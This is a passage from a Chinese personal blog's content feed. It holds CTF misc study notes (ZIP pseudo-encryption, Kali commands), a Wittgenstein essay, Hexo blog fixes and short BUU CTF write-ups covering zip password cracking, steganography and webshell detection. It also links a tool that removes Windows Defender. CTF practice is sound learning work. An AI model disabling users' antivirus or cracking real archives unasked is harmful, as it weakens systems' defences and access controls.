# 压缩源文件压缩后大小</span><br><span class="line">    - uint frUncompressedSize # 压缩源文件压缩前大小</span><br><span class="line">    - ushort frFileNameLength # 压缩源文件名长度</span><br><span class="line">    - ushort frExtraFieldLength # 压缩源文件扩展域长度</span><br><span class="line">    - char frFileName[frFileNameLength] # 压缩源文件名</span><br><span class="line">    - uchar frData[frCompressedSize] # 压缩源文件数据</span><br><span class="line">+ ZIPDIRENTRY dirEntry # 压缩源文件目录区</span><br><span class="line">    - char deSignature[4] # 目录标志</span><br><span class="line">    - ushort deVersionMadeBy # 创建该条目的版本</span><br><span class="line">    - ushort deVersionNeeded # 解压该条目所需的版本</span><br><span class="line">    - ushort deFlags # 标志位 (判断是不是伪加密的位置，如果是真加密则两个都是0900，伪加密这个则是0000或0100)</span><br><span class="line">    - enum COMPTYPE deCompression # 压缩方法</span><br><span class="line">    - DOSTIME deFileTime # 最后修改时间</span><br><span class="line">    - DOSDATE deFileDate # 最后修改日期</span><br><span class="line">    - uint deCrc # CRC32校验值</span><br><span class="line">    - uint deCompressedSize # 压缩后的大小</span><br><span class="line">    - uint deUncompressedSize # 压缩前的大小</span><br><span class="line">    - ushort deFileNameLength # 文件名长度</span><br><span class="line">    - ushort deExtraFieldLength # 扩展域长度</span><br><span class="line">    - ushort deFileCommentLength # 文件评论长度</span><br><span class="line">    - ushort deDiskNumberStart # 起始磁盘编号</span><br><span class="line">    - ushort deInternalAttributes # 内部属性</span><br><span class="line">    - uint deExternalAttributes # 外部属性</span><br><span class="line">    - uint deRelativeOffset # 该条目在 ZIP 文件中的偏移位置</span><br><span class="line">    - char deFileName[deFileNameLength] # 文件名</span><br><span class="line">    - char deExtraField[deExtraFieldLength] # 扩展域</span><br><span class="line">    - char deFileComment[deFileCommentLength] # 文件评论</span><br><span class="line">+ ZIPENDLOCATOR endLocator # 压缩源文件目录结束标志</span><br><span class="line">    - char elSignature[4] # 结束标志</span><br><span class="line">    - ushort elDiskNumber # 当前磁盘编号</span><br><span class="line">    - ushort elStartDiskNumber # 目录开始的磁盘编号</span><br><span class="line">    - ushort elEntriesOnDisk # 当前磁盘上的条目数量</span><br><span class="line">    - ushort elEntriesTotal # 总条目数量</span><br><span class="line">    - uint elSizeOfDirectory # 目录的总大小</span><br><span class="line">    - uint elOffsetOfDirectory # 目录开始的偏移位置</span><br><span class="line">    - ushort elCommentLength # 注释长度</span><br><span class="line">    - char elComment[elCommentLength] # 注释</span><br></pre></td></tr></table></figure><h2 id="一些kali的小知识"><a href="#一些kali的小知识" class="headerlink" title="一些kali的小知识"></a><u>一些kali的小知识</u></h2><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">ls  #列出所有东西</span><br><span class="line">cd  #切换</span><br><span class="line">pwd #列出路径</span><br><span class="line">cat  #查看</span><br><span class="line">tac #cat的反向，逆向(行)读取</span><br><span class="line">mkdir #创建目录</span><br><span class="line">mv #移动文件/重命名文件</span><br><span class="line">cp #复制文件/目录</span><br><span class="line">nl #加行号</span><br><span class="line">more #按页读取内容</span><br><span class="line">ps #查看进程信息</span><br><span class="line">less #查看文件内容，与more相似</span><br><span class="line">head #仅打印文件开头内容</span><br><span class="line">tail #仅打印文件结尾内容</span><br><span class="line">ping #远程连接，如主机</span><br><span class="line">jobs #查看后台运行任务</span><br><span class="line">kill #杀死后台运行任务，需要加-pid</span><br><span class="line">which #查找文件所在位置</span><br><span class="line">whereis #查找文件路径</span><br><span class="line">locate #查找文件路径，与whereis相似</span><br><span class="line">find #向下遍历寻找文件</span><br><span class="line"></span><br><span class="line">--help #任何命令后加这个即可看到说明</span><br><span class="line">sudo su  #提升权限至管理员</span><br><span class="line">rm -rf profire_name  #删除文件目录</span><br><span class="line">ifconfig  #查看ip地址</span><br></pre></td></tr></table></figure><h3 id="切换python版本"><a href="#切换python版本" class="headerlink" title="切换python版本"></a>切换python版本</h3><p>kali自带python2.7和python3.x，有时候需要我们切换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-alternatives --config python</span><br></pre></td></tr></table></figure><p>然后选序号就行</p><h3 id="图形化桌面-远程连接"><a href="#图形化桌面-远程连接" class="headerlink" title="图形化桌面-远程连接"></a>图形化桌面-远程连接</h3><p>这个要自己下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kex</span><br></pre></td></tr></table></figure><h3 id="虚拟环境"><a href="#虚拟环境" class="headerlink" title="虚拟环境"></a>虚拟环境</h3><p>Kali Linux 对 Python 包管理进行了限制，防止系统范围内的 Python 安装被破坏。所以有时候报错是需要使用虚拟环境</p><p>创建一个新的虚拟环境：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m venv env  #env是虚拟环境名称，可以更改</span><br></pre></td></tr></table></figure><p>激活虚拟环境：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source env/bin/activate</span><br></pre></td></tr></table></figure><p>在虚拟环境中就可以安装一些东西了</p><p>退出虚拟环境：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure><p>删除虚拟环境只需要删除对应虚拟环境的目录即可</p><h2 id="一些windows的小知识"><a href="#一些windows的小知识" class="headerlink" title="一些windows的小知识"></a><u>一些windows的小知识</u></h2><h3 id="基本命令-1"><a href="#基本命令-1" class="headerlink" title="基本命令"></a>基本命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls  #列出所有东西</span><br><span class="line">cd  #切换</span><br><span class="line">cat  #查看</span><br><span class="line">ipconfig  #查看ip地址</span><br></pre></td></tr></table></figure><h3 id="alt"><a href="#alt" class="headerlink" title="alt"></a>alt</h3><p>按住alt再按小键盘的数字的话可以输出对应的ascii码值，比如我按住alt再按65的话会输出A</p><h3 id="删除windows自带防火墙——windows-defender"><a href="#删除windows自带防火墙——windows-defender" class="headerlink" title="删除windows自带防火墙——windows defender"></a>删除windows自带防火墙——windows defender</h3><p>github地址： <a href="https://github.com/ionuttbara/windows-defender-remover">https://github.com/ionuttbara/windows-defender-remover</a></p><h2 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a><u>Linux提权</u></h2><p>详细见我这篇博客 <a href="https://metaviii.github.io/2025/01/Linux%E6%8F%90%E6%9D%83%E6%B5%85%E6%9E%90/">Linux提权浅析 | MetaVi</a></p><h2 id="区块链Blockchain"><a href="#区块链Blockchain" class="headerlink" title="区块链Blockchain"></a><u>区块链Blockchain</u></h2><p>详见我这篇博客 <a href="https://metaviii.github.io/2025/02/%E5%8C%BA%E5%9D%97%E9%93%BEBlockchain%E5%AD%A6%E4%B9%A0/">区块链Blockchain学习 | MetaVi</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>哲学-维特根斯坦</title>
      <link href="/2024/11/%E5%93%B2%E5%AD%A6-%E7%BB%B4%E7%89%B9%E6%A0%B9%E6%96%AF%E5%9D%A6/"/>
      <url>/2024/11/%E5%93%B2%E5%AD%A6-%E7%BB%B4%E7%89%B9%E6%A0%B9%E6%96%AF%E5%9D%A6/</url>
      
        <content type="html"><![CDATA[<h1 id="维特根斯坦：天才与之责任"><a href="#维特根斯坦：天才与之责任" class="headerlink" title="维特根斯坦：天才与之责任"></a>维特根斯坦：天才与之责任</h1><h2 id="0-写在前面"><a href="#0-写在前面" class="headerlink" title="0.写在前面"></a>0.写在前面</h2><p>这个本来是我高中时候做过的关于维特根斯坦的ppt，突然发现就想着把它发到博客上，于是乎就如此了。</p><p>文章的大部分内容摘自《打开：周濂的一百堂西方哲学课》（这个是真好看，又通俗易懂）</p><p>。</p><h2 id="1-生平"><a href="#1-生平" class="headerlink" title="1.生平"></a>1.生平</h2><p><strong>路德维希·维特根斯坦</strong></p><p>二十世纪<u>最伟大</u>的哲学家（没有之一）</p><p>路德维希·维特根斯坦（Ludwig Wittgenstein）是20世纪最重要的哲学家之一，被公认为分析哲学的重要代表。他于1889年出生于奥地利，后来移居英国。维特根斯坦的思想主要围绕着语言、逻辑和意义展开，他的两部重要著作是《逻辑哲学论》和《哲学探讨》。</p><p>在《逻辑哲学论》中，他试图通过逻辑分析语言，揭示哲学问题的本质，并提出了“言语游戏”的概念，强调语言的使用与特定社会活动和上下文相关。</p><p>而在《哲学探讨》中，他的思想有所转变，开始强调语言的多样性和复杂性，强调语言的使用是基于社会实践和交流的。</p><p>维特根斯坦的思想对逻辑学、语言哲学、认知科学等领域都产生了深远影响，他被认为是20世纪哲学最重要的思想家之一，其作品至今仍受到广泛研究和讨论。</p><img src="2.jpg" alt="2" style="zoom:50%;"><h2 id="2-早期维特根斯坦——《逻辑哲学论》"><a href="#2-早期维特根斯坦——《逻辑哲学论》" class="headerlink" title="2.早期维特根斯坦——《逻辑哲学论》"></a>2.早期维特根斯坦——《逻辑哲学论》</h2><p><strong>全书共分七个章节，章节之间或并列或递进。</strong></p><p><strong>全书的主旨要义在于将能<u>“说”</u>的都说清楚</strong></p><h3 id="图像理论：-语言与世界具有相同的逻辑形式"><a href="#图像理论：-语言与世界具有相同的逻辑形式" class="headerlink" title="图像理论： 语言与世界具有相同的逻辑形式"></a>图像理论： 语言与世界具有相同的逻辑形式</h3><p>接下来我们介绍一下著名的“图像理论”， 这是理解《逻辑哲学论》的关键所在。“一战”期间， 维特根斯坦偶然读到一篇文章，报道了巴黎交通法院的判案过程， 在裁决汽车事故时， 法官经常用玩具模型来模拟现场发生的一切。读到这里，维特根斯坦灵光一现，意识到模型发挥的作用与命题是一样的， 都是在刻画和表现现实世界里的事实。也就是说， 语言和世界存在着对应关系。打个比方，当我们说“一辆轿车在左转时与迎面而来的卡车相撞”， 这句话与现场发生的车祸具备逻辑上的同构性，用维特根斯坦的原话说就是：“语言与世界具有通过图像映示关系相联系的平行结构。”</p><p>在“4.014”节中， 维特根斯坦说：“唱片、音乐主题、乐谱和音波之间的关系正同语言与世界之间的内在描绘关系一样。它们都是按照一个共同的逻辑图样构造出来的。”</p><h3 id="逻辑同构性"><a href="#逻辑同构性" class="headerlink" title="逻辑同构性"></a>逻辑同构性</h3><p>维特根斯坦认为，语言与世界之间同样存在着逻辑同构性——复合语句对应着复合事态， 原子语句对应着原子事实， 名称对应着简单对象。而复合语句、原子语句与名称彼此之间则是一个充分分析直到最终无法分析的关系。同样， 复合事态、原子事实和简单对象之间也是这样的关系。</p><p><img src="3.png" alt="3"></p><h3 id="说到这里，-我们可以再做一个小结："><a href="#说到这里，-我们可以再做一个小结：" class="headerlink" title="说到这里， 我们可以再做一个小结："></a>说到这里， 我们可以再做一个小结：</h3><p>首先， 乍看上去， 维特根斯坦是在主张某种符合论的观点，也就是语言反映事实， 就像镜子反映世界。但实际上他的观点要比符合论更神秘， 他认为语言和事实具有某种逻辑的同构性， 用维特根斯坦的话说就是具有相同的“逻辑形式”。</p><p>其次， 维特根斯坦在这里体现出一种充分分析的态度。我刚才说了， 任何复合的语句都可以充分分析成最小单位也即名称，同样，任何复合的事态都可以充分分析成最小单位也即简单对象。</p><h3 id="无法说出的逻辑形式"><a href="#无法说出的逻辑形式" class="headerlink" title="无法说出的逻辑形式"></a>无法说出的逻辑形式</h3><p>那么究竟什么叫作逻辑形式? 这又是一个非常难以理解的概念， 虽然就乐谱和琴声的例子而言， 我们可以体会到二者之间存在着某种共同的逻辑形式， 但是这种逻辑形式到底是什么， 似乎依旧无法给出进一步的说明。事实上， 维特根斯坦就是这样认为的，在他看来， 逻辑形式只能显现， 无法说出</p><h3 id="《逻辑哲学论》中不可说的神秘之物"><a href="#《逻辑哲学论》中不可说的神秘之物" class="headerlink" title="《逻辑哲学论》中不可说的神秘之物"></a>《逻辑哲学论》中不可说的神秘之物</h3><p> 在《逻辑哲学论》这本书中，存在着很多只能显现但不能说出的神秘之物。借助陈嘉映的总结，这些不可说的东西包括： 逻辑形式，哲学问题， 伦理学、美学等学科， 以及包括以上三类在内的所有神秘的东西。</p><p> 为什么这些东西是不可说的? 不可说的东西就是不重要的吗?对此最简单的回答就是， 它们之所以不可说， 是因为它们不是实证科学， 它们谈论的是事实之外的东西。但是这绝不意味着不可说的东西是不重要的， 恰恰相反， 维特根斯坦曾经说过， 那些在《逻辑哲学论》中没有正面处理的内容， 比方说美、生活的意义、死亡，等等， 恰恰是最重要的。</p><p> 为什么不可说的是最重要的? 引用战时笔记中的一句话：“伦理学不处理世界。正如逻辑一样， 伦理学必定是世界的一个条件。”所谓条件的意思是， 如果没有它， 世界将不成其为世界， 你说它重要不重要?</p><h3 id="”梯子“"><a href="#”梯子“" class="headerlink" title="”梯子“"></a>”梯子“</h3><p>在这个意义上我们甚至可以说，《逻辑哲学论》并非一本关于逻辑的著作，而是一本关于罪及与之相关的伦理、美、生活的意义的著作。虽然维特根斯坦谈论最多的是逻辑， 但逻辑只是梯子， 真正重要的东西在楼上，一旦登上了楼， 就可以撤掉梯子了。</p><p>在“6.52”这一节中， 维特根斯坦说：“我们觉得， 即使一切可能的科学问题都已得到解答， 人生问题也还完全未被触及。”</p><h3 id="第七章"><a href="#第七章" class="headerlink" title="第七章"></a>第七章</h3><p>全书第七章只有一句话：</p><p><strong>“<u>对于不可说的东西我们必须保持沉默。</u>”</strong></p><p>————————————————————————————————————————</p><h2 id="3-后期维特根斯坦——《哲学研究》"><a href="#3-后期维特根斯坦——《哲学研究》" class="headerlink" title="3.后期维特根斯坦——《哲学研究》"></a>3.后期维特根斯坦——《哲学研究》</h2><p>维特根斯坦反维特根斯坦：</p><p>•《哲学研究》</p><h3 id="反本质主义："><a href="#反本质主义：" class="headerlink" title="反本质主义："></a>反本质主义：</h3><p>不要追求走出<u>柏拉图的洞穴</u>，哲学不用追求本质，追求本质是一种“<strong>哲学病</strong>”！</p><p>打个比方，当有人问我们“什么是金星”的时候， 我们会非常自信地把手指向天际， 告诉他们：“喏， 就是那颗最亮的星星。”可是当有人问“什么是时间”的时候， 我们试图去寻找像金星一样的时间实体， 却发现自己茫然失措， 找不着北。</p><p>为什么会出现这样的困惑? 因为我们被这两个表达式表面上的一致性给迷惑了， 以为“什么是金星”和“什么是时间”问的是同一类型的问题， 所以我们也就很自然地像寻找金星那样去寻找作为实体的时间。其实， 表面上一致的问题并不一定是同一类型的问题。</p><p> 类似的诱惑无处不在， 不管是哲学家还是普通人都难以幸免。仍旧举上一讲的例子， 当说到工具二字的时候， 我们会情不自禁地想在各种工具之间寻找“共同之处”，与此类似的是， 当我们把语言看成是各种不同类型的语言游戏时， 又会忍不住去想：什么是游戏之为游戏的“共同之处”? 我们似乎总是倾向于要去总结一些什么，仿佛这么做才显得很哲学。</p><p>也就是说，我们不应该对一些概念下定义，自以为得到了本质。</p><h3 id="哲学冲动："><a href="#哲学冲动：" class="headerlink" title="哲学冲动："></a>哲学冲动：</h3><p>设想有人说:“所有的工具都是用来改变某种东西的，例如，锤子改变钉子的位置，锯子改变板子的形状，等等。”–尺子改变的是什么?胶水瓶和钉子改变的是什么?“改变我们对某样东西的了解，改变胶的温度和箱子的稳固程度。”–表达式是弄得一致了，但我们得到了什么呢?</p><p>那些有着哲学冲动的人就试图用“改变”这个概念来定义工具的本质，可是这只是一种幻觉，它的确把表达式弄得一致了，因为所有的工具好像在改变什么，但是维特根斯坦反问，这真的有助于加深我们对工具的理解吗?</p><p>维特根斯坦说，我们要放弃一种幻觉，以为我们可以抓住语言的无可与之相比的本质，“其实，只要‘语言’、‘经验’、‘世界’这些词有用处，它们的用处一定像‘桌子’、‘灯’、‘门’这些词一样卑微”。</p><h3 id="”完全的黑暗“"><a href="#”完全的黑暗“" class="headerlink" title="”完全的黑暗“"></a>”完全的黑暗“</h3><p>奥古斯丁有句名言:“那么，什么是时间呢?如果没有谁问我，我倒还知道它是什么;可是，当我被问及它是什么，并试着解释时，我却糊涂了。”对此，维特根斯坦评论说:“没有谁问我们的时候我们还知道，可是要给它们一个解释时又不知道的东西，正是我们需要提醒自己注意的东西。”因为这些东西诱使我们以科学的方式提出问题并回答问题，“什么是时间”这个问题与“什么是金星”，或者“氢的比重是多少”只具有表面的相似性，如果我们看不到它们的<strong>差异性</strong>，我们就会被带入“<strong>完全的黑暗</strong>”之中。</p><h3 id="“家族相似性”"><a href="#“家族相似性”" class="headerlink" title="“家族相似性”"></a>“家族相似性”</h3><p>在《哲学研究》第66节中，维特根斯坦问道:“棋类游戏，牌类游戏，球类游戏，角力游戏，它们的共同之处是什么?”然后，他立刻自我反驳道:“一不要说:它们一定有某种共同之处，否则它们不会都叫做游戏。’”</p><p>维特根斯坦给出的建议是“不要想，而要看”，看到它们之间的“相似之处”和“亲缘关系”，而不是想象中的“共同之处”。</p><p>那么游戏之间到底是什么关系呢？维特根斯坦说:“我想不出比‘家族相似’更好的说法。</p><p>讨论到这里,我们可以说,各种“游戏”构成了一个家族,各种“工具”构成了另一个家族，我们之所以把这类活动称为游戏，把那类对象称为工具，不是因为在它们的背后存在着所谓的本质(想想亚里士多德)，也不是因为我们可以对它们进行普遍定义(想想苏格拉底)，而是因为它们之间存在着“家族相似性”。</p><h3 id="让一切如其所是："><a href="#让一切如其所是：" class="headerlink" title="让一切如其所是："></a>让一切如其所是：</h3><p>蒙克说“人们常常引用维特根斯坦谈哲学的话——哲学‘让一切如其所是’。但人们常常看不到，在力求什么也不改变，只改变我们看待事物的方式时，维特根斯坦试图改变一切。”</p><p><strong>就这样，维特根斯坦做到了什么也没有改变，可一切又都改变了。</strong></p><p>————————————————————————————————————————</p><p>1951年4月28日，维特根斯坦去世，留给这个世界的最后一句话是：</p><p><em>“告诉他们我度过了极好的一生”</em></p>]]></content>
      
      
      <categories>
          
          <category> philosophy </category>
          
      </categories>
      
      
        <tags>
            
            <tag> philosophy </tag>
            
            <tag> Wittgenstein </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>blog 为何上传不了图像的解决</title>
      <link href="/2024/11/blog-%E4%B8%BA%E4%BD%95%E4%B8%8A%E4%BC%A0%E4%B8%8D%E4%BA%86%E5%9B%BE%E5%83%8F%E7%9A%84%E8%A7%A3%E5%86%B3/"/>
      <url>/2024/11/blog-%E4%B8%BA%E4%BD%95%E4%B8%8A%E4%BC%A0%E4%B8%8D%E4%BA%86%E5%9B%BE%E5%83%8F%E7%9A%84%E8%A7%A3%E5%86%B3/</url>
      
        <content type="html"><![CDATA[<h1 id="前两天我一直困在为何博客上传不了图像"><a href="#前两天我一直困在为何博客上传不了图像" class="headerlink" title="前两天我一直困在为何博客上传不了图像"></a>前两天我一直困在为何博客上传不了图像</h1><h2 id="而现在我似乎找到了解决方法"><a href="#而现在我似乎找到了解决方法" class="headerlink" title="而现在我似乎找到了解决方法"></a>而现在我似乎找到了解决方法</h2><p>首先你要先下了hexo-asset-image</p><p>而且在config.yml里有个post_asset_folder:要为true</p><p>要做到创建新博客时候能在同目录下自动创建同名文件夹，img就可以放在这个文件夹里面</p><p>然后再typora里设置要选择优先<strong>相对路径</strong>（这个很重要</p><p>保证相对路径的时候再插入图片</p><p>插入图片后查看github对应的文件夹下面有没有相应的图片</p><p><em><strong>因为本质上插入的图片引用的是github的路径，如果github对应目录上没有该图片的话自然在博客上显示不出来</strong></em></p><p>然后再</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>三连试试，每试完一遍可以直接去github上看看，<strong>如果没有这个图片的话试试这个</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br></pre></td></tr></table></figure><p>就这四个来回试，直到对应的github文件夹下出现对应图片就可以上传成功了</p><p><img src="11.png" alt="11"></p><p>类似于这样，要在github目录下能看到，<del>而且似乎图片的命名要简单（？</del></p><p>如果还传不上去的话可以缩放图片试试</p><p><del>（猜想：说不定可以直接在github上add file，下次试试）</del></p><p><del>ps：（这是不是图片加载慢的原因？）</del></p><h1 id="顺便记录一下我博客的其他问题的解决"><a href="#顺便记录一下我博客的其他问题的解决" class="headerlink" title="顺便记录一下我博客的其他问题的解决"></a>顺便记录一下我博客的其他问题的解决</h1><h2 id="友链"><a href="#友链" class="headerlink" title="友链"></a>友链</h2><p>我靠我之前友链一直不能输中文，否则就会报错+显示不了</p><p>现在才发现是vs的问题，，用记事本编辑就能正常上传+打开了。服了</p><h2 id="评论区"><a href="#评论区" class="headerlink" title="评论区"></a>评论区</h2><p>我用的是Valine，要去LeanCloud注册账号才行，网上教程很多</p><p>但是好像有泄露的风险？</p><h2 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h2><p>我是去algolia注册账号才能搜索的</p><p>结果发现只能所搜文章的标题，不能搜索文章里的内容（我要你有啥用？</p><p><strong>待解决</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACMer</title>
      <link href="/2024/11/ACMer/"/>
      <url>/2024/11/ACMer/</url>
      
        <content type="html"><![CDATA[<p>还没想好写啥</p><p><img src="111.jpg" alt="111"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Misc Record</title>
      <link href="/2024/11/Misc-Record/"/>
      <url>/2024/11/Misc-Record/</url>
      
        <content type="html"><![CDATA[<h1 id="Misc刷题"><a href="#Misc刷题" class="headerlink" title="Misc刷题"></a>Misc刷题</h1><h2 id="1-BUU刷题"><a href="#1-BUU刷题" class="headerlink" title="1.BUU刷题"></a>1.BUU刷题</h2><p><strong>终于刷到100题了！</strong></p><p><strong>目标刷到第七页</strong></p><h3 id="1-签到"><a href="#1-签到" class="headerlink" title="1.签到"></a>1.签到</h3><p>顾名思义，签到，复制提交就好</p><h3 id="2-金三胖"><a href="#2-金三胖" class="headerlink" title="2.金三胖"></a>2.金三胖</h3><p>简单的拆分gif，打开puzzlesolver一把梭</p><h3 id="3-你竟然赶我走"><a href="#3-你竟然赶我走" class="headerlink" title="3.你竟然赶我走"></a>3.你竟然赶我走</h3><p>010一把梭</p><p><img src="1.png" alt="1"></p><h3 id="4-二维码"><a href="#4-二维码" class="headerlink" title="4.二维码"></a>4.二维码</h3><p>用随波逐流分析一下发现有隐藏文件，binwalk提取出一个zip，加密的打开提示我们是4number，arp爆破出密码是7639，打开txt得到flag{vjpw_wnoei}</p><h3 id="5-大白"><a href="#5-大白" class="headerlink" title="5.大白"></a>5.大白</h3><p>随波逐流爆宽高即可</p><img src="2.png" alt="2" style="zoom:50%;"><h3 id="6-乌镇峰会种图"><a href="#6-乌镇峰会种图" class="headerlink" title="6.乌镇峰会种图"></a>6.乌镇峰会种图</h3><p>随波逐流一把梭</p><h3 id="7-wireshark"><a href="#7-wireshark" class="headerlink" title="7.wireshark"></a>7.wireshark</h3><p>查找password，追踪tcp流，得到password&#x3D;ffb7567a1d4f4abdffdb54e022f8facd</p><h3 id="8-N种方法解决"><a href="#8-N种方法解决" class="headerlink" title="8.N种方法解决"></a>8.N种方法解决</h3><p>随波逐流梭出一张二维码，微信一扫就拿到flag</p><h3 id="9-基础破解"><a href="#9-基础破解" class="headerlink" title="9.基础破解"></a>9.基础破解</h3><p>Arp暴力破解密码得到密码是2563，txt是base64加密，解密就行</p><h3 id="10-文件中的秘密"><a href="#10-文件中的秘密" class="headerlink" title="10.文件中的秘密"></a>10.文件中的秘密</h3><p>文件属性里有flag</p><h3 id="11-zip伪加密"><a href="#11-zip伪加密" class="headerlink" title="11.zip伪加密"></a>11.zip伪加密</h3><p>随波逐流伪加密修复即可</p><h3 id="12-LSB"><a href="#12-LSB" class="headerlink" title="12.LSB"></a>12.LSB</h3><p>Lsb隐写，用stegsolve打开可以发现藏了一张png，保存下来是一张二维码，扫一下就好</p><h3 id="13-被嗅探的流量"><a href="#13-被嗅探的流量" class="headerlink" title="13.被嗅探的流量"></a>13.被嗅探的流量</h3><p>随波逐流一把梭</p><h3 id="14-rar"><a href="#14-rar" class="headerlink" title="14.rar"></a>14.rar</h3><p>Arp爆破得到密码8795，flag{1773c5da790bd3caff38e3decd180eb7}</p><h3 id="15-qr"><a href="#15-qr" class="headerlink" title="15.qr"></a>15.qr</h3><p>CQR扫一下就行</p><h3 id="16-镜子里的世界"><a href="#16-镜子里的世界" class="headerlink" title="16.镜子里的世界"></a>16.镜子里的世界</h3><p>Zsteg一把梭</p><h3 id="17-爱因斯坦"><a href="#17-爱因斯坦" class="headerlink" title="17.爱因斯坦"></a>17.爱因斯坦</h3><p>Binwalk提取zip，要密码，在图片的属性中可以看到密码，得到flag</p><h3 id="18-ningen"><a href="#18-ningen" class="headerlink" title="18.ningen"></a>18.ningen</h3><p>图片先binwalk提取出zip，zip爆破密码得出8368，解密得到flag</p><h3 id="19-小明的保险箱"><a href="#19-小明的保险箱" class="headerlink" title="19.小明的保险箱"></a>19.小明的保险箱</h3><p>图片先binwalk提取出zip，zip爆破密码得出7869，解密得到flag</p><h3 id="20-Easycap"><a href="#20-Easycap" class="headerlink" title="20.Easycap"></a>20.Easycap</h3><p>拖进winshark，追踪TCP流得到flag</p><h3 id="21-隐藏的钥匙"><a href="#21-隐藏的钥匙" class="headerlink" title="21.隐藏的钥匙"></a>21.隐藏的钥匙</h3><p>010打开，查找base，得到加密过的数据。解密一下就是flag</p><h3 id="22-另外一个世界"><a href="#22-另外一个世界" class="headerlink" title="22.另外一个世界"></a>22.另外一个世界</h3><p>010打开后在文件末尾出现了一串神秘的二进制串，cherchef解密后恰好是flag</p><h3 id="23-数据包中的线索"><a href="#23-数据包中的线索" class="headerlink" title="23.数据包中的线索"></a>23.数据包中的线索</h3><p>导出对象为http时，追踪tcp流得到一串神秘的base64加密，复制进随波逐流用base64转图片就能看到flag</p><img src="3.png" alt="3" style="zoom:50%;"><h3 id="24-神秘龙卷风"><a href="#24-神秘龙卷风" class="headerlink" title="24.神秘龙卷风"></a>24.神秘龙卷风</h3><p>得到zip加密爆破得到密码5463，解密出的txt有多个+和.&gt;，猜测为字频统计，以.&gt;为分割，编写脚本得到flag</p><img src="4.png" alt="4" style="zoom:67%;"><h3 id="25-FLAG"><a href="#25-FLAG" class="headerlink" title="25.FLAG"></a>25.FLAG</h3><p>得到的图片用stegsolve打开查看lsb，得到一个压缩包，解压后没有后缀</p><p><img src="5.png" alt="5"></p><p>File一下发现是elf，用kali打开即可</p><p><img src="6.png" alt="6"></p><h3 id="26-假如给我三天光明"><a href="#26-假如给我三天光明" class="headerlink" title="26.假如给我三天光明"></a>26.假如给我三天光明</h3><p>拿到png一看就知道是盲文加密，解密后是kmdonowg，即为压缩包密码，解压后得到一段摩斯密码的音频，对应解密后是flag</p><h3 id="27-后门查杀"><a href="#27-后门查杀" class="headerlink" title="27.后门查杀"></a><strong>27.后门查杀</strong></h3><p>打开跟我说有病毒。。给我隔离了。。。</p><p>选择保留在电脑上，得到一个html文件夹</p><p>这里需要使用D盾来查杀</p><img src="2024-11-21 164839.png" alt="2024-11-21 164839" style="zoom:50%;"><p>看到</p><img src="2024-11-21 164508.png" alt="2024-11-21 164508" style="zoom:50%;"><p>得到密码，flag：flag{6ac45fb83b3bc355c024f5034b947dd3}</p><h3 id="28-webshell后门"><a href="#28-webshell后门" class="headerlink" title="28.webshell后门"></a><strong>28.webshell后门</strong></h3><p>与上题类似。D盾扫描</p><img src="2024-11-21 165430.png" alt="2024-11-21 165430" style="zoom:50%;"><p>在第一个文件中能看到pass，flag：flag{ba8e6c6f35a53933b871480bb9a9545c}</p><h3 id="29-来首歌吧"><a href="#29-来首歌吧" class="headerlink" title="29.来首歌吧"></a><strong>29.来首歌吧</strong></h3><p>简单的摩斯密码，打开audacity对照频谱图手敲莫斯密码即可</p><img src="2024-11-18 225047.png" alt="2024-11-18 225047" style="zoom: 50%;"><p>（ ↑ 为一部分频谱图 ）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...../-.../-.-./----./..---/...../-..../....-/----./-.-./-.../-----/.----/---../---../..-./...../..---/./-..../.----/--.../-../--.../-----/----./..---/----./.----/----./.----/-.-./</span><br></pre></td></tr></table></figure><p>随波逐流解密即可</p><h3 id="30-面具下的flag"><a 